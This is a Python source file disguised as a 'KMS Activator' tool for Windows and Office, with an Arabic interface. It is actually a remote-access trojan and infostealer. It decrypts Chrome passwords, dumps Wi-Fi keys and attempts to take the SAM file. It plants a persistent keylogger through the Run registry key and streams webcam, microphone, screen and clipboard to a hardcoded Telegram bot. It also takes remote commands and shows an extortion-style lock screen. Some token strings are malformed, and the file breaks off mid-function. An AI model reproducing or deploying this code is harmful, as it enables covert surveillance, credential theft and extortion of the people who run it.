import platform
import getpass
import pyautogui
import tkinter as tk
import customtkinter as ctk
import subprocess
import os
import requests
import cv2
import tempfile
import random
import string
import threading
import time
import pyperclip
import webbrowser
import winsound
import win32gui
import win32con
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import Image, ImageTk, ImageDraw
from datetime import datetime
import io
import sqlite3
import win32crypt
import shutil
import ctypes
import sys
import json
import base64
from Crypto.Cipher import AES
import numpy as np
import winreg

# Telegram Settings
TELEGRAM_BOT_TOKEN = "7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY"
TELEGRAM_CHAT_ID = "8042482389"
UNLOCK_CODE = ''.join(random.choices(string.digits, k=6))

last_update_id = [None]
latest_msg = {"type": None, "content": None}

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{"7905634492":AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendMessage"
    data = {"chat_id": 8042482389, "text": message}
    try:
        response = requests.post(url, data=data)
        if not response.ok:
            raise Exception(f"HTTP Error {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Failed to send to Telegram: {str(e)}")

def send_to_telegram_split(message):
    max_length = 4096
    if len(message) <= max_length:
        send_to_telegram(message)
    else:
        for i in range(0, len(message), max_length):
            part = message[i:i + max_length]
            send_to_telegram(part)
            time.sleep(1)

def send_photo_to_telegram(img_path):
    try:
        with open(img_path, "rb") as f:
            response = requests.post(
                f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendPhoto",
                files={"photo": f},
                data={"chat_id": 8042482389
}
            )
            if not response.ok:
                raise Exception(f"HTTP Error {response.status_code}: {response.text}")
    except Exception as e:
        send_to_telegram_split(f"⚠️ فشل في إرسال الصورة: {str(e)}")

def send_video_to_telegram(video_path):
    try:
        with open(video_path, "rb") as f:
            response = requests.post(
                f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY
}/sendVideo",
                files={"video": f},
                data={"chat_id": 8042482389
, "caption": "تسجيل فيديو"}
            )
            if not response.ok:
                raise Exception(f"HTTP Error {response.status_code}: {response.text}")
    except Exception as e:
        send_to_telegram_split(f"⚠️ فشل في إرسال الفيديو: {str(e)}")

def send_audio_to_telegram(audio_path):
    try:
        with open(audio_path, "rb") as f:
            response = requests.post(
                f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendAudio",
                files={"audio": f},
                data={"chat_id": 8042482389, "caption": "تسجيل صوتي"}
            )
            if not response.ok:
                raise Exception(f"HTTP Error {response.status_code}: {response.text}")
    except Exception as e:
        send_to_telegram_split(f"⚠️ فشل في إرسال الصوت: {str(e)}")

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        send_to_telegram_split("⚠️ ملف 'Local State' غير موجود. تأكد من تثبيت Chrome.")
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
            send_to_telegram_split("⚠️ مفتاح التشفير غير موجود في 'Local State'.")
            return None
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        if not key.startswith(b'DPAPI'):
            send_to_telegram_split("⚠️ تنسيق مفتاح التشفير غير متوقع في 'Local State'.")
            return None
        key = key[5:]  # Remove 'DPAPI' prefix
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        send_to_telegram_split("🔑 تم استخراج مفتاح التشفير بنجاح من 'Local State'.")
        return decrypted_key
    except Exception as e:
        send_to_telegram_split(f"⚠️ فشل في فك تشفير مفتاح التشفير من 'Local State': {str(e)}")
        return None

def decrypt_password(password, key):
    try:
        if not password.startswith(b'v10') and not password.startswith(b'v11'):
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(password)[:-16].decode()
        return decrypted
    except Exception as e:
        return f"[فشل فك التشفير: {str(e)}]"

def extract_browser_credentials():
    try:
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_path):
            send_to_telegram_split("⚠️ ملف 'Login Data' غير موجود في مسار Chrome. تأكد من تثبيت Chrome وتسجيل الدخول.")
            return

        temp_db = os.path.join(tempfile.gettempdir(), "Login_Data_temp")
        shutil.copy2(chrome_path, temp_db)

        if not os.path.exists(temp_db) or os.path.getsize(temp_db) == 0:
            send_to_telegram_split("⚠️ فشل في نسخ ملف 'Login Data' أو أنه فارغ. تحقق من الصلاحيات.")
            return

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
        if not cursor.fetchone():
            send_to_telegram_split("⚠️ جدول 'logins' غير موجود في قاعدة البيانات. الملف قد يكون تالفًا أو فارغًا.")
            conn.close()
            os.remove(temp_db)
            return

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        
        if not rows:
            send_to_telegram_split("⚠️ لا توجد بيانات تسجيل دخول مخزنة في Chrome.")
            conn.close()
            os.remove(temp_db)
            return

        encryption_key = get_encryption_key()
        if not encryption_key:
            send_to_telegram_split("⚠️ تعذر استخراج مفتاح التشفير. شغّل الكود كمستخدم عادي.")
            conn.close()
            os.remove(temp_db)
            return

        credentials = []
        for row in rows:
            url, username, encrypted_password = row
            if username and encrypted_password:
                password = decrypt_password(encrypted_password, encryption_key)
                credentials.append(f"🌐 الموقع: {url}\n👤 الإيميل/اسم المستخدم: {username}\n🔒 كلمة المرور: {password}")
            else:
                credentials.append(f"🌐 الموقع: {url}\n👤 الإيميل/اسم المستخدم: {username or '[غير متوفر]'}\n🔒 كلمة المرور: [غير متوفرة]")

        conn.close()
        os.remove(temp_db)

        if credentials:
            message = "📋 بيانات تسجيل الدخول من Chrome:\n\n" + "\n\n".join(credentials)
            send_to_telegram_split(message)
        else:
            send_to_telegram_split("⚠️ لم يتم العثور على بيانات صالحة لتسجيل الدخول في Chrome.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ عام أثناء استخراج بيانات المتصفح: {str(e)}")
        if os.path.exists(temp_db):
            os.remove(temp_db)

def send_startup_info():
    try:
        username = getpass.getuser()
        os_info = platform.platform()
        cpu = platform.processor()
        device_name = platform.node()
        message = f"🖥️ جلسة جديدة بدأت\n👤 المستخدم: {username}\n💻 الجهاز: {device_name}\n🧠 المعالج: {cpu}\n🧾 نظام التشغيل: {os_info}"
        send_to_telegram_split(message)
        screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.jpg")
        pyautogui.screenshot().save(screenshot_path)
        send_photo_to_telegram(screenshot_path)
        os.remove(screenshot_path)
        extract_browser_credentials()
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في إرسال معلومات بدء التشغيل: {str(e)}")

send_startup_info()

# زرع الكيلوجر عند تشغيل التطبيق
device_name = platform.node()
try:
    keylogger_script = (
        'import keyboard\n'
        'import time\n'
        'import requests\n'
        'import cv2\n'
        'import os\n'
        'import tempfile\n\n'
        f'TELEGRAM_BOT_TOKEN = "{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}"\n'
        f'TELEGRAM_CHAT_ID = "{8042482389}"\n'
        f'DEVICE_NAME = "{device_name}"\n'
        'logged_keys = ""\n'
        'LOG_FILE = os.path.join(tempfile.gettempdir(), "keylog.txt")\n\n'
        'def log_to_file(message):\n'
        '    with open(LOG_FILE, "a", encoding="utf-8") as f:\n'
        '        f.write(f"[{time.ctime()}] {message}\\n")\n\n'
        'def send_to_telegram(message):\n'
        '    url = "https://api.telegram.org/bot" + 7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY + "/sendMessage"\n'
        '    data = {"chat_id": 8042482389, "text": message}\n'
        '    try:\n'
        '        response = requests.post(url, data=data)\n'
        '        if response.status_code == 200:\n'
        '            log_to_file(f"تم إرسال الرسالة: {message}")\n'
        '        else:\n'
        '            log_to_file(f"فشل الإرسال: HTTP {response.status_code}")\n'
        '    except Exception as e:\n'
        '        log_to_file(f"خطأ في الإرسال: {str(e)}")\n\n'
        'def send_photo_to_telegram(img_path):\n'
        '    try:\n'
        '        with open(img_path, "rb") as f:\n'
        '            url = "https://api.telegram.org/bot" + 7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY + "/sendPhoto"\n'
        '            response = requests.post(url, files={"photo": f}, data={"chat_id": T8042482389})\n'
        '            if response.status_code == 200:\n'
        '                log_to_file(f"تم إرسال الصورة: {img_path}")\n'
        '            else:\n'
        '                log_to_file(f"فشل إرسال الصورة: HTTP {response.status_code}")\n'
        '    except Exception as e:\n'
        '        log_to_file(f"خطأ في إرسال الصورة: {str(e)}")\n\n'
        'def capture_camera():\n'
        '    try:\n'
        '        cap = cv2.VideoCapture(0)\n'
        '        ret, frame = cap.read()\n'
        '        if ret:\n'
        '            img_path = os.path.join(tempfile.gettempdir(), "keylogger_capture.jpg")\n'
        '            cv2.imwrite(img_path, frame)\n'
        '            send_photo_to_telegram(img_path)\n'
        '            os.remove(img_path)\n'
        '        else:\n'
        '            log_to_file("فشل التقاط الصورة: لا إطار متاح")\n'
        '        cap.release()\n'
        '    except Exception as e:\n'
        '        log_to_file(f"خطأ في التقاط الصورة: {str(e)}")\n\n'
        'def on_key_press(event):\n'
        '    global logged_keys\n'
        '    try:\n'
        '        key_name = event.name\n'
        '        if not key_name:\n'
        '            log_to_file("اسم المفتاح فارغ")\n'
        '            return\n'
        '        if len(key_name) > 1:\n'
        '            if key_name == "space":\n'
        '                logged_keys += " "\n'
        '            elif key_name == "enter":\n'
        '                logged_keys += "\\n"\n'
        '            elif key_name == "backspace":\n'
        '                logged_keys = logged_keys[:-1] if logged_keys else ""\n'
        '            else:\n'
        '                logged_keys += f"[{key_name}]"\n'
        '        else:\n'
        '            logged_keys += key_name\n'
        '        if len(logged_keys) >= 100:\n'
        '            message = f"[تتبع الكيبورد من {DEVICE_NAME}]:\\n{logged_keys}"\n'
        '            send_to_telegram(message)\n'
        '            capture_camera()\n'
        '            logged_keys = ""\n'
        '    except Exception as e:\n'
        '        log_to_file(f"خطأ في تتبع الكيبورد: {str(e)}")\n'
        '        send_to_telegram(f"⚠️ خطأ في تتبع الكيبورد على {DEVICE_NAME}: {str(e)}")\n\n'
        'def start_keylogger():\n'
        '    try:\n'
        '        log_to_file("بدأ الكيلوجر")\n'
        '        send_to_telegram(f"✅ الكيلوجر يعمل الآن على {DEVICE_NAME}")\n'
        '        keyboard.on_press(on_key_press)\n'
        '        while True:\n'
        '            time.sleep(10)\n'
        '    except Exception as e:\n'
        '        log_to_file(f"فشل تشغيل الكيلوجر: {str(e)}")\n'
        '        send_to_telegram(f"⚠️ فشل تشغيل الكيلوجر على {DEVICE_NAME}: {str(e)}")\n\n'
        'if __name__ == "__main__":\n'
        '    start_keylogger()\n'
    )

    keylogger_path = os.path.join(os.environ["APPDATA"], "system_service.py")
    with open(keylogger_path, "w", encoding="utf-8") as f:
        f.write(keylogger_script)

    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, f"pythonw {keylogger_path}")
    winreg.CloseKey(reg_key)

    subprocess.Popen(["pythonw", keylogger_path], creationflags=subprocess.CREATE_NO_WINDOW)
    send_to_telegram_split(f"⌨️ تم زرع ملف تتبع الكيبورد بنجاح على {device_name} وسيعمل في الخلفية.")
except Exception as e:
    send_to_telegram_split(f"⚠️ خطأ في زرع ملف تتبع الكيبورد عند التشغيل: {str(e)}")

def load_gif_frames(gif_url, width, height):
    response = requests.get(gif_url)
    gif_data = io.BytesIO(response.content)
    gif = Image.open(gif_data)
    frames = []
    try:
        while True:
            frame = gif.copy()
            frame = frame.resize((width, height), Image.Resampling.LANCZOS)
            frames.append(ImageTk.PhotoImage(frame.convert("RGB")))
            gif.seek(gif.tell() + 1)
    except EOFError:
        pass
    return frames

def animate_gif(label, frames, frame_index=0):
    if not label.winfo_exists():
        return
    label.configure(image=frames[frame_index])
    frame_index = (frame_index + 1) % len(frames)
    label.after(100, animate_gif, label, frames, frame_index)

def capture_camera():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        img_path = os.path.join(tempfile.gettempdir(), "camera_capture.jpg")
        cv2.imwrite(img_path, frame)
        send_photo_to_telegram(img_path)
        os.remove(img_path)
        send_to_telegram_split(f"📸 تم التقاط صورة من الكاميرا على {device_name}.")
    else:
        send_to_telegram_split(f"⚠️ فشل في التقاط صورة من الكاميرا على {device_name}.")
    cap.release()

def record_audio(duration=5):
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
    write(audio_path, fs, recording)
    send_audio_to_telegram(audio_path)
    os.remove(audio_path)
    send_to_telegram_split(f"🎤 تم تسجيل الصوت وإرساله من {device_name}.")

def record_screen(duration=10):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_path = os.path.join(tempfile.gettempdir(), "screen_record.avi")
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_size.width, screen_size.height))
    start_time = time.time()
    while (time.time() - start_time) < duration:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()
    send_video_to_telegram(video_path)
    os.remove(video_path)
    send_to_telegram_split(f"📹 تم تسجيل الشاشة وإرسالها من {device_name}.")

def shutdown_pc():
    os.system("shutdown /s /t 0")
    send_to_telegram_split(f"🖥️ تم إيقاف تشغيل الكمبيوتر {device_name}.")

def collect_and_send_images():
    image_extensions = ('.jpg', '.jpeg', '.png')
    search_dirs = [
        os.path.join(os.environ["USERPROFILE"], "Pictures"),
        os.path.join(os.environ["USERPROFILE"], "Desktop"),
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Downloads"),
        "C:\\"
    ]
    
    send_to_telegram_split(f"📸 جاري البحث عن الصور وإرسالها إلى Telegram من {device_name}...")
    found_images = 0
    
    for directory in search_dirs:
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        img_path = os.path.join(root, file)
                        try:
                            send_photo_to_telegram(img_path)
                            found_images += 1
                            time.sleep(0.5)
                        except Exception as e:
                            send_to_telegram_split(f"⚠️ فشل في إرسال الصورة {img_path} من {device_name}: {str(e)}")
        except Exception as e:
            send_to_telegram_split(f"⚠️ خطأ أثناء البحث في {directory} على {device_name}: {str(e)}")
    
    send_to_telegram_split(f"✅ تم الانتهاء من إرسال الصور من {device_name}. العدد الإجمالي: {found_images}")

def extract_system_passwords():
    try:
        sam_path = "C:\\Windows\\System32\\config\\SAM"
        if os.path.exists(sam_path):
            send_to_telegram_split(f"[تم العثور على ملف SAM على {device_name}]: {sam_path}")
            with open(sam_path, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendDocument",
                    files={"document": f},
                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"ملف SAM المستخرج من {device_name}"}
                )
        else:
            send_to_telegram_split(f"⚠️ ملف SAM غير موجود على {device_name}.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في استخراج ملف SAM من {device_name}: {str(e)}")

    try:
        profiles = subprocess.getoutput("netsh wlan show profiles")
        wifi_list = []
        profile_names = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]
        
        for profile in profile_names:
            details = subprocess.getoutput(f"netsh wlan show profile name=\"{profile}\" key=clear")
            for line in details.splitlines():
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    wifi_list.append(f"📡 الشبكة: {profile}\n🔑 كلمة المرور: {password}")
                    break
            else:
                wifi_list.append(f"📡 الشبكة: {profile}\n🔑 كلمة المرور: [غير متاحة]")
        
        if wifi_list:
            message = f"📶 كلمات مرور شبكات Wi-Fi من {device_name}:\n\n" + "\n\n".join(wifi_list)
            send_to_telegram_split(message)
        else:
            send_to_telegram_split(f"⚠️ لا توجد شبكات Wi-Fi مخزنة على {device_name}.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في استخراج كلمات مرور Wi-Fi من {device_name}: {str(e)}")

ctk.set_appearance_mode("light")
root = ctk.CTk()
root.title("KMS Activator")
root.geometry("450x600")
root.resizable(False, False)

root.configure(fg_color="#E6F0FA")
main_frame = ctk.CTkFrame(root, fg_color="#F8FAFC", corner_radius=20, border_width=2, border_color="#DBEAFE")
main_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.9, relheight=0.9)

title_label = ctk.CTkLabel(main_frame, text="KMS ACTIVATOR", font=("Arial", 24, "bold"), text_color="#1E40AF")
title_label.pack(pady=20)

button_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
button_frame.pack(pady=10, padx=20, fill="both")

attempts_left = [6]
media_label = None
media_image_label = None
lock_window = None

def fetch_latest_telegram_message():
    global last_update_id
    try:
        url = f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/getUpdates?offset={last_update_id[0] + 1 if last_update_id[0] else 0}"
        response = requests.get(url, timeout=10).json()
        if "result" in response and response["result"]:
            for update in response["result"]:
                last_update_id[0] = update["update_id"]
                msg = update.get("message", {})
                text = msg.get("text")
                if text:
                    send_to_telegram_split(f"📩 تم استلام الأمر على {device_name}: {text}")
                    if text == "!screenshot":
                        screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
                        pyautogui.screenshot().save(screenshot_path)
                        send_photo_to_telegram(screenshot_path)
                        os.remove(screenshot_path)
                        send_to_telegram_split(f"📷 تم إرسال لقطة الشاشة من {device_name}.")
                    elif text == "!camera":
                        capture_camera()
                    elif text == "!record_audio":
                        threading.Thread(target=record_audio, args=(5,), daemon=True).start()
                        send_to_telegram_split(f"🎤 جاري تسجيل الصوت (5 ثوانٍ) على {device_name}...")
                    elif text == "!record_screen":
                        threading.Thread(target=record_screen, args=(10,), daemon=True).start()
                        send_to_telegram_split(f"📹 جاري تسجيل الشاشة (10 ثوانٍ) على {device_name}...")
                    elif text == "!shutdown":
                        shutdown_pc()
                    elif text.startswith("!open "):
                        url = text.split("!open ", 1)[1].strip()
                        if url:
                            webbrowser.open(url)
                            send_to_telegram_split(f"🌐 تم فتح الرابط على {device_name}: {url}")
                        else:
                            send_to_telegram_split(f"⚠️ يرجى إدخال رابط صالح بعد '!open' على {device_name}")
                    else:
                        send_to_telegram_split(f"⚠️ أمر غير معروف على {device_name}: {text}")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في جلب الرسائل من Telegram على {device_name}: {str(e)}")

def show_telegram_image(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/getFile?file_id={file_id}").json()
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/{file_path}"
        img_bytes = requests.get(file_url).content
        img = Image.open(io.BytesIO(img_bytes)).resize((300, 200))
        img_tk = ImageTk.PhotoImage(img)
        media_image_label.configure(image=img_tk)
        media_image_label.image = img_tk
        media_label.configure(text="")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ في عرض الصورة على {device_name}: {str(e)}")

def update_display():
    global media_label, media_image_label, lock_window
    fetch_latest_telegram_message()
    if latest_msg["type"] == "text":
        content = latest_msg["content"]
        if content in ["!screenshot", "!camera", "!record_audio", "!record_screen", "!shutdown"] or content.startswith("!open "):
            pass
        elif content == "!photo":
            screenshot = pyautogui.screenshot()
            temp_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
            screenshot.save(temp_path)
            send_photo_to_telegram(temp_path)
            os.remove(temp_path)
        elif content == "!record":
            fs = 44100
            seconds = 5
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            temp_audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
            write(temp_audio_path, fs, recording)
            send_audio_to_telegram(temp_audio_path)
            os.remove(temp_audio_path)
        elif content == "!open_browser":
            webbrowser.open("https://www.google.com")
        elif content == "!unlock" or content == "!decrypt":
            if lock_window and lock_window.winfo_exists():
                lock_window.grab_release()
                lock_window.destroy()
        if media_label:
            media_label.configure(text=content)
        if media_image_label:
            media_image_label.configure(image="")
    elif latest_msg["type"] == "photo":
        if media_image_label:
            show_telegram_image(latest_msg["content"])
    elif latest_msg["type"] == "video":
        if media_label:
            media_label.configure(text=latest_msg["content"])
        if media_image_label:
            media_image_label.configure(image="")
    root.after(2000, update_display)

def send_unlock_code():
    try:
        user_info = subprocess.getoutput('powershell -Command "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name"')
        sid_info = subprocess.getoutput('whoami /user')
        message = f"رمز الفتح: {UNLOCK_CODE}\nالمستخدم: {user_info}\nSID: {sid_info}\nالجهاز: {device_name}"
    except Exception as e:
        message = f"رمز الفتح: {UNLOCK_CODE}\n[فشل في الحصول على معلومات المستخدم: {str(e)}]\nالجهاز: {device_name}"
    send_to_telegram_split(message)

def show_fullscreen_lock():
    global lock_window, media_label, media_image_label
    send_unlock_code()
    
    lock_window = ctk.CTkToplevel()
    lock_window.attributes("-fullscreen", True)
    lock_window.attributes("-topmost", True)
    lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
    lock_window.focus_force()
    lock_window.grab_set()
    lock_window.configure(fg_color="#E6F0FA")

    ctk.CTkLabel(lock_window, text="@Cyb_Hack أدخل كلمني على التيليجرام", font=("Arial", 50), text_color="#1E40AF").pack(pady=30)
    ctk.CTkLabel(lock_window, text="أدخل رمز الفتح الذي تم إرساله على تيليجرام", font=("Arial", 16), text_color="#1E40AF").pack(pady=10)

    ctk.CTkLabel(lock_window, text="أدخل اسمك", font=("Arial", 16), text_color="#1E40AF").pack(pady=10)
    name_entry = ctk.CTkEntry(lock_window, font=("Arial", 20), fg_color="#F8FAFC", border_color="#DBEAFE", width=300)
    name_entry.pack(pady=10)

    display_frame = ctk.CTkFrame(lock_window, fg_color="transparent")
    display_frame.pack(pady=20)

    media_label = ctk.CTkLabel(display_frame, text="", font=("Arial", 14), text_color="#1E40AF")
    media_label.pack()
    media_image_label = ctk.CTkLabel(display_frame, text="")
    media_image_label.pack()

    code_entry = ctk.CTkEntry(lock_window, font=("Arial", 20), show="*", fg_color="#F8FAFC", border_color="#DBEAFE", width=300)
    code_entry.pack(pady=10)

    def check_code():
        entered_name = name_entry.get().strip()
        if not entered_name:
            error_label.configure(text="يرجى إدخال اسمك أولاً!", text_color="orange")
            return

        if code_entry.get() == UNLOCK_CODE:
            try:
                username = getpass.getuser()
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = (
                    f"✅ تم إلغاء القفل بنجاح\n"
                    f"👤 من: {entered_name}\n"
                    f"💻 اسم المستخدم: {username}\n"
                    f"🖥️ اسم الجهاز: {device_name}\n"
                    f"⏰ الوقت: {current_time}"
                )
                send_to_telegram_split(message)
            except Exception as e:
                send_to_telegram_split(f"✅ تم إلغاء القفل بنجاح\nخطأ في جمع البيانات: {str(e)}\nالجهاز: {device_name}")
            lock_window.grab_release()
            lock_window.destroy()
        else:
            try:
                username = getpass.getuser()
                os_info = platform.platform()
                os_version = platform.version()
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                message = (
                    f"محاولة فتح من: {entered_name}\n"
                    f"👤 اسم المستخدم: {username}\n"
                    f"💻 اسم الجهاز: {device_name}\n"
                    f"🧾 نظام التشغيل: {os_info}\n"
                    f"📌 إصدار النظام: {os_version}\n"
                    f"⏰ الوقت: {current_time}\n"
                    f"رمز الفتح المُدخل: {code_entry.get()}\n"
                    f"🔑 الرمز الصحيح: {UNLOCK_CODE}"
                )
                send_to_telegram_split(message)
            except Exception as e:
                send_to_telegram_split(f"محاولة فتح من: {entered_name}\nخطأ في جمع البيانات: {str(e)}\n🔑 الرمز الصحيح: {UNLOCK_CODE}\nالجهاز: {device_name}")

            attempts_left[0] -= 1
            if attempts_left[0] <= 0:
                winsound.Beep(1000, 1000)
                error_label.configure(text="تم استنفاد جميع المحاولات!", text_color="red")
            else:
                error_label.configure(text=f"رمز خاطئ، متبقي {attempts_left[0]} محاولة", text_color="orange")

    ctk.CTkButton(lock_window, text="تحقق", font=("Arial", 16), command=check_code, fg_color="#A78BFA", text_color="white", corner_radius=20, hover_color="#8B5CF6").pack(pady=10)
    
    gif_url = "https://media.giphy.com/media/SqflD5OvHoWILB7qWm/giphy.gif?cid=790b761110oz00ofc8jpx2pgqxt38jmxfbj6z7dz0jio5ge4&ep=v1_gifs_trending&rid=giphy.gif&ct=g"
    gif_frames = load_gif_frames(gif_url, 300, 200)
    gif_label = ctk.CTkLabel(lock_window, text="")
    gif_label.pack(pady=10)
    animate_gif(gif_label, gif_frames)

    error_label = ctk.CTkLabel(lock_window, text="", font=("Arial", 14), text_color="red")
    error_label.pack()
    update_display()

def activate_windows():
    output = subprocess.getoutput("cscript //nologo C:\\Windows\\System32\\slmgr.vbs /skms kms.digiboy.ir && cscript //nologo C:\\Windows\\System32\\slmgr.vbs /ato")
    send_to_telegram_split(f"نتيجة تفعيل ويندوز على {device_name}:\n{output}")
    cap = cv2.VideoCapture(0)
    for i in range(10):
        ret, frame = cap.read()
        if ret:
            img_path = os.path.join(tempfile.gettempdir(), f"capture_{i}.jpg")
            cv2.imwrite(img_path, frame)
            send_photo_to_telegram(img_path)
            os.remove(img_path)
            time.sleep(0.1)
    cap.release()

def activate_office():
    def record_and_send():
        while True:
            filename = os.path.join(tempfile.gettempdir(), "office_record.avi")
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
            start_time = time.time()
            while int(time.time() - start_time) < 60:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
            cap.release()
            out.release()
            send_video_to_telegram(filename)
            os.remove(filename)
            time.sleep(0.5)
    threading.Thread(target=record_and_send, daemon=True).start()
    output = subprocess.getoutput("cd \"C:\\Program Files\\Microsoft Office\\Office16\" && cscript ospp.vbs /sethst:kms.digiboy.ir && cscript ospp.vbs /act")
    send_to_telegram_split(f"نتيجة تفعيل أوفيس على {device_name}:\n{output}")

def monitor_clipboard():
    last_text = ""
    while True:
        try:
            current_text = pyperclip.paste()
            if current_text != last_text:
                last_text = current_text
                send_to_telegram_split(f"[الحافظة من {device_name}]:\n{current_text}")
            time.sleep(10)
        except:
            pass

def record_audio_loop():
    fs = 44100
    duration = 60
    while True:
        try:
            audio = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            filename = os.path.join(tempfile.gettempdir(), "recorded_audio.wav")
            write(filename, fs, audio)
            send_audio_to_telegram(filename)
            os.remove(filename)
            time.sleep(0.1)
        except Exception as e:
            send_to_telegram_split(f"⚠️ خطأ في تسجيل الصوت على {device_name}: {str(e)}")
            time.sleep(5)

for i, (text, cmd, color, hover) in enumerate([
    ("تفعيل ويندوز", activate_windows, "#A78BFA", "#8B5CF6"),
    ("تفعيل أوفيس", activate_office, "#60A5FA", "#3B82F6"),
    ("حالة التفعيل", show_fullscreen_lock, "#F472B6", "#EC4899"),
    ("تفعيل فوتوشوب", extract_system_passwords, "#F87171", "#EF4444"),
    ("اضغط للأهمية", collect_and_send_images, "#FCD34D", "#FBBF24")
]):
    row_frame = ctk.CTkFrame(button_frame, fg_color="transparent")
    row_frame.pack(fill="x", pady=10)
    num_label = ctk.CTkLabel(row_frame, text=str(i+1), font=("Arial", 16, "bold"), text_color=color,
                            fg_color="#F8FAFC", width=40, height=40, corner_radius=20)
    num_label.pack(side="left", padx=(0, 15))
    btn = ctk.CTkButton(row_frame, text=text, command=cmd, fg_color=color, text_color="white",
                       font=("Arial", 14), corner_radius=25, hover_color=hover, height=45)
    btn.pack(side="left", fill="x", expand=True)

input_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
input_frame.pack(pady=20, padx=20, fill="x")

input_entry = ctk.CTkEntry(input_frame, width=300, font=("Arial", 12), placeholder_text="اكتب رسالة لإرسالها إلى تيليجرام",
                          fg_color="#F8FAFC", border_color="#DBEAFE", corner_radius=15)
input_entry.pack(side="left", padx=(0, 10))

def send_input_to_telegram():
    message = input_entry.get()
    if message.strip():
        send_to_telegram_split(f"[رسالة من الواجهة على {device_name}]:\n{message}")
        input_entry.delete(0, "end")

send_button = ctk.CTkButton(input_frame, text="إرسال", command=send_input_to_telegram, fg_color="#10B981",
                           text_color="white", font=("Arial", 12), corner_radius=20, hover_color="#059669", height=40)
send_button.pack(side="left")
input_entry.bind("<Return>", lambda event: send_input_to_telegram())

def on_closing():
    try:
        username = getpass.getuser()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = (
            f"❌ تم إنهاء الجلسة\n"
            f"👤 اسم المستخدم: {username}\n"
            f"💻 اسم الجهاز: {device_name}\n"
            f"⏰ الوقت: {current_time}"
        )
        send_to_telegram_split(message)
    except Exception as e:
